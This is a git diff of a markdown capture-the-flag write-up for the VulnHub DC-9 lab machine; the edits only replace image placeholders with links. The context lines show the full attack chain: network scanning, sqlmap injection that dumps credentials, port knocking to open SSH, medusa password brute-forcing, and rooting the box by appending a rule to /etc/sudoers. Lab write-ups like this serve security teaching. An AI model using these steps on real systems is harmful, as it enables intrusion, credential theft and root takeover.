@@ -7,13 +7,13 @@ Once the VM is up, we need to find the IP address of it. I setup my kali VM and 
 netdiscover -r 10.0.2.0/24
 arp-scan --interface eth0 10.0.2.0/24
 ```
-**1-arpscan.png**
+![arp-scan](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/DC-9/images/1-arpscan.png)
 
 Looks like 10.0.2.19 is the DC9 machine
 Lets run a quick nmap on this
 `nmap -sA -sV -oA nmap/dc9 10.0.2.19`
 
-**2-nmap.png**
+![2-nmap.png](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/DC-9/images/2-nmap.png)
 
 port 22 is filtered, which means there is some kind of firewall rule blocking the port. iptables is generally used to configure such rules and reject packets reaching to the port.
 
@@ -23,7 +23,7 @@ Lets start by running `gobuster` on the site to find all the pages
 ```
 gobuster dir -u http://10.0.2.19 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php 2>&1 | tee gobuster.txt
 ```
-**3-gobuster**
+![3-gobuster](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/DC-9/images/3-gobuster.png)
 
 There are some interesting pages */server-status.php, /config.php, /session.php*
 Looks like the session.php page automatically logs you in as admin.
@@ -36,7 +36,7 @@ Lets go back to the search page and see if we can inject anything there.
 
 lets open the request in burp
 
-**4-burp.png**
+![4-burp.png](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/DC-9/images/4-burp.png)
 
 We can copy the request to a file and then use the file in `sqlmap`
 This looks like a UNION SQL injection, so lets use sqlmap with union technique
@@ -45,8 +45,8 @@ sqlmap -r req --technique=U --dump
 sqlmap -r req --dbs
 sqlmap -r req -D users --dump
 ```
-**5-tables.png**
-**6-users.png**
+![5-tables.png](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/DC-9/images/5-Table.png)
+![6-users.png](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/DC-9/images/6-Users.png)
 
 Looks like it is using MySQL
 We can find the credentials of all the users and these these credentials work for logging in into the site.
@@ -66,7 +66,7 @@ At this point, I was stuck and got some help from other walkthroughs.
 Apparently, there is a `knockd` process which provides port knocking service (a port is opened only if the port is scanned in a specific way)
 The conf file is in /etc/knockd.conf
 
-**7-knockd-conf.png**
+![7-knockd-conf.png](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/DC-9/images/7-knockd-conf.png)
 
 According to the conf file, ports 7469, 8475, 9842 must be scanned for port 22 to be open. And they have to be scanned in reverse order to close port 22
 We can quickly run nmap for just these ports in this order.
@@ -77,7 +77,7 @@ nmap -p 22 10.0.2.19
 ```
 now, port 22 is open
 
-**9-sshopen.png**
+![9-sshopen.png](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/DC-9/images/8-sshopen.png)
 
 Now, since we have admin and other users' credentials, we can try ssh'ing
 ssh was failing for admin and marym users. We can use `medusa` to see which users are able to login. we can create a creds file from the sqlmap output and use it with medusa.
@@ -90,7 +90,7 @@ Only chandlerb, joeyt and janitor can login. Lets login and enumerate using line
 
 I didn't find anything interesting in joeyt and chandlerb. But janitor has some passwords
 
-**9-janitor.png**
+![9-janitor.png](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/DC-9/images/9-janitor.png)
 
 We can try these passwords again with the rest of the users and see if they work. This time, we don't know which password works for which user, so lets create users file with all usernames and passwords file with these newly found passwords. `medusa` can check all combinations to see if any password works with any user
 ```
@@ -103,7 +103,7 @@ fredf has permissions to use `/opt/devstuff/dist/test`
 When I try to run, it says  `Usage: python test.py read append`
 going through test.py, it looks like the script takes two files as arguments, reads the first file and appends it to the second file
 
-**10-test.py**
+![10-test.py](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/DC-9/images/10-test..png)
 
 Since we use sudo while running the test binary, we can use it to edit sudoers rules
 
@@ -113,8 +113,8 @@ echo 'fredf	   ALL=(ALL:ALL) ALL' > sudoAdd
 sudo /opt/devstuff/dist/test/test sudoAdd /etc/sudoers
 sudo bash
 ```
-**11-root.png**
+![11-root.png](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/DC-9/images/11-root.png)
 
 In the root folder there is a file 'theflag.txt' and this is the flag
 
-**12-flag.png**
+![12-flag.png](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/DC-9/images/12-flag.png)
